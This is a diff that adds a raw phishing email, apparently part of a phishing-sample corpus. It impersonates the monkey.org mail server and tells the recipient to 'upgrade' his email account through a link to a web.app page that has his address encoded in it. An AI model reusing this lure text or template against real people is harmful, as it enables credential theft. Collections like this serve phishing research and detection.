@@ -1,0 +1,128 @@
+Return-Path: abuse@supercynic.live
+Delivered-To: jose@monkey.org
+X-FDA: 77868810306.51.BDFB135
+Received: from su.supercynic.live (su.supercynic.live [45.95.168.233])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP id 2C7B5101D877B
+	for <jose@monkey.org>; Sun, 28 Feb 2021 20:26:52 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=mail; d=supercynic.live;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=info@supercynic.live; bh=I0zPgm5gxiK7M/gog2Y+RWLSuBg=; =?utf-8?q?b=3DUkQ5?=
+ =?utf-8?q?ku3yMo3uNa46kfWcc4AdGt+mrtytABunOL6YMfws54JmmFek7EePQ437OQazCrFm0?=
+ =?utf-8?q?HfyrA8+?=  
+ nVE5qMx8QLov//imZuaPsehVyusVS7qFIXYi7qaCiGOWaLQAN3iynIdK9/ioBu1EGGi6h1aVST6I
+   z7v7xqG5YIK/Qqk7UMU=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=mail; d=supercynic.live; 
+ =?utf-8?q?b=3DiuspstsXR/a9+gy2rz5C55Bqih3SoJgosQcoC9huCLN+3lMQgyn+u8+pbwIKR?=
+ =?utf-8?q?+7FWL4kX2fDmaMe?=  
+ dZV2klTPxAQBT3gcfVjXG0+Ge+HQt6SQdVEqTb12jLLX3+3CPBnfvJSBkQ4dtp+2Vgtna37eNYRP
+   vM586C+Z2Fh9ok+FqZk=;
+From: monkey.org Mail Server <info@supercynic.live>
+To: jose@monkey.org
+Subject: Email Service Upgrade
+Date: 28 Feb 2021 15:26:50 -0500
+Message-ID: <20210228152650.A296CA06D4136008@supercynic.live>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_EF6FFC64.7551B69B"
+X-Spam-Status: No, score=5.13
+X-Stat-Signature: xmz3k673kgzggbfxnhf1p9o7n9tc76if
+X-Rspamd-Queue-Id: 2C7B5101D877B
+X-Rspamd-Server: rspam03
+Received-SPF: none (supercynic.live>: No applicable sender policy available)
+ receiver=imf15.b.tucows.com; identity=mailfrom;
+ envelope-from="<abuse@supercynic.live>"; helo=su.supercynic.live;
+ client-ip=45.95.168.233
+X-HE-DKIM-Result: pass/pass
+X-Spam-Summary: =?utf-8?q?50=2C0=2C0=2Cbb5f445584843422=2Cd41d8cd98f00b204?=
+ =?utf-8?q?=2Cabuse=40supercynic=2Elive=2Cjose=40monkey=2Eorg=2CRULES=5FHIT?=
+ =?utf-8?b?OjQxOjcyOjE1MjozNTU6Mzc5Ojk2Mjo5Njc6OTY5Ojk3Mzo5ODM6OTg4Ojk4OTox?=
+ =?utf-8?q?135=3A1137=3A1140=3A1189=3A1208=3A1221=3A1308=3A1309=3A1313=3A131?=
+ =?utf-8?q?4=3A1345=3A1381=3A1431=3A1436=3A1437=3A1516=3A1517=3A1518=3A1534?=
+ =?utf-8?q?=3A1542=3A1561=3A1575=3A1588=3A1589=3A1592=3A1594=3A1623=3A1711?=
+ =?utf-8?q?=3A1714=3A1730=3A1748=3A1768=3A1779=3A1792=3A2194=3A2196=3A2198?=
+ =?utf-8?q?=3A2199=3A2200=3A2201=3A2525=3A2543=3A2560=3A2563=3A2682=3A2685?=
+ =?utf-8?q?=3A2731=3A2737=3A2859=3A2890=3A2900=3A2933=3A2937=3A2939=3A2942?=
+ =?utf-8?q?=3A2945=3A2947=3A2951=3A2954=3A3022=3A3040=3A3138=3A3139=3A3140?=
+ =?utf-8?q?=3A3141=3A3142=3A3421=3A3867=3A3868=3A3871=3A3873=3A3874=3A3889?=
+ =?utf-8?q?=3A3934=3A3936=3A3938=3A3941=3A3944=3A3947=3A3950=3A3953=3A3956?=
+ =?utf-8?q?=3A3959=3A4042=3A4184=3A4361=3A4552=3A4903=3A5007=3A6300=3A6650?=
+ =?utf-8?q?=3A6653=3A6674=3A6678=3A8603=3A9025=3A9108=3A9416=3A9908=3A10004?=
+ =?utf-8?q?=3A11473=3A11658=3A12043=3A12297=3A12438=3A12551=3A12555=3A12660?=
+ =?utf-8?q?=3A12740=3A12895=3A13139=3A13235=3A13237=3A13275=3A13439=3A14093?=
+ =?utf-8?q?=3A14096=3A14180=3A14181=3A14596=3A14659=3A14721=3A14877=3A21060?=
+ =?utf-8?q?=3A21080=3A21433=3A21450=3A21451=3A21627=3A21660=3A21804=3A21819?=
+ =?utf-8?q?=3A21881=3A21917=3A21939=3A30001=3A30022=3A30026=3A30054=3A30075?=
+ =?utf-8?q?=2C0=2CRBL=3A04yg7c6x5pobguzjqr78yo7x7o3iyof4ahphmud3ppse5xbsazj8?=
+ =?utf-8?q?zanoagaynhw=2Ekrak5jurdghk1wep17kpcs7uyikujr5abp5y_4mjkdoox3endbn?=
+ =?utf-8?q?mi4upmtdz9ufc=2Ewqmzgabi8b6meiggnr6utnu6x66g-lbl8=2Emailshell=2En?=
+ =?utf-8?q?et-223=2E238=2E255=2E100=2CCacheIP=3Anone=2CBayesian=3A0=2E5=2C0?=
+ =?utf-8?q?=2E5=2C0=2E5=2CNetcheck=3Anone=2CDomainCache=3A0=2CMSF=3Anot?=
+ bulk,SPF:,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:28,LUA_SUMMARY:none
+X-HE-Tag: 1614544012-643619
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 15
+
+
+------=_NextPart_000_0012_EF6FFC64.7551B69B
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hi,
+We are happy to announce that your order is ready for delivery.
+Best Regards.
+------=_NextPart_000_0012_EF6FFC64.7551B69B
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD><TITLE></TITLE>
+<META charset=3DUTF-8>
+<META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=3D1.0"=
+>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV id=3Ditll style=3D"BOX-SIZING: border-box; FONT-SIZE: 17px; FONT-FAMIL=
+Y: 'Helvetica Neue', 'Segoe UI', Helvetica, Arial, 'Lucida Grande', sans-se=
+rif; PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING-LEFT: 30px; PADDING-R=
+IGHT: 30px">
+<DIV id=3Dibuy style=3D"BORDER-TOP-STYLE: ridge; BOX-SIZING: border-box; BO=
+RDER-LEFT-STYLE: ridge; WIDTH: 750px; BORDER-BOTTOM-STYLE: ridge; BORDER-RI=
+GHT-STYLE: ridge">
+<DIV id=3Digjh style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 50px; PADDI=
+NG-TOP: 50px; PADDING-LEFT: 50px; PADDING-RIGHT: 50px">
+<DIV id=3Didpj style=3D"BOX-SIZING: border-box; WIDTH: 100%; BACKGROUND: #0=
+874ac; COLOR: #ffffff; PADDING-BOTTOM: 8px; TEXT-ALIGN: center; PADDING-TOP=
+: 8px; PADDING-LEFT: 8px; PADDING-RIGHT: 8px">Email Service Upgrade </DIV>
+<DIV id=3Dirwy style=3D"BOX-SIZING: border-box; MARGIN-TOP: 60px">
+<H3 id=3Di7wu style=3D"BOX-SIZING: border-box; COLOR: #807e7e">monkey.org <=
+/H3>
+<P id=3Di81vn style=3D"BOX-SIZING: border-box"><STRONG id=3Die64a style=3D"=
+BOX-SIZING: border-box">Dear jose,</STRONG> </P>
+<P id=3Di1k6f style=3D"BOX-SIZING: border-box">You are highly advised to up=
+grade your email account to our new and upgraded services. </P>
+<P id=3Di2q3w style=3D"BOX-SIZING: border-box"></P>
+<P id=3Di3bi3 style=3D"BOX-SIZING: border-box"></P>
+<P id=3Dikpfm style=3D"BOX-SIZING: border-box">Kindly upgrade your email ac=
+count, to enable you enjoy our new email features. </P></DIV>
+<DIV id=3Div7jg style=3D"BOX-SIZING: border-box; MARGIN-TOP: 60px; TEXT-ALI=
+GN: center"><A id=3Dix8la style=3D"BOX-SIZING: border-box; TEXT-DECORATION:=
+ none; BACKGROUND: #0874ac; COLOR: #ffffff; PADDING-BOTTOM: 15px; PADDING-T=
+OP: 15px; PADDING-LEFT: 15px; PADDING-RIGHT: 15px" href=3D"https://bajzxjwe=
+wq.web.app/#am9zZUBtb25rZXkub3Jn" target=3D_blank>Upgade Your Email Account=
+=2E</A> </DIV>
+<DIV id=3Diidvt style=3D"BOX-SIZING: border-box; MARGIN-TOP: 60px">
+<P id=3Diowwi style=3D"BOX-SIZING: border-box">Thanks for trusting our serv=
+ices. </P></DIV>
+<DIV id=3Difsxh style=3D"BOX-SIZING: border-box; MARGIN-TOP: 60px">
+<HR id=3Dipgnr style=3D"BOX-SIZING: border-box; BORDER-BOTTOM-WIDTH: 1px">
+
+<P id=3Dizxq1 style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; COLOR: #807=
+e7e"></P></DIV>
+<H4 id=3Di9u0u style=3D"BOX-SIZING: border-box">&#65533; 2021 monkey.org Se=
+rver </H4></DIV></DIV></DIV></BODY></HTML>
+------=_NextPart_000_0012_EF6FFC64.7551B69B--
+
+
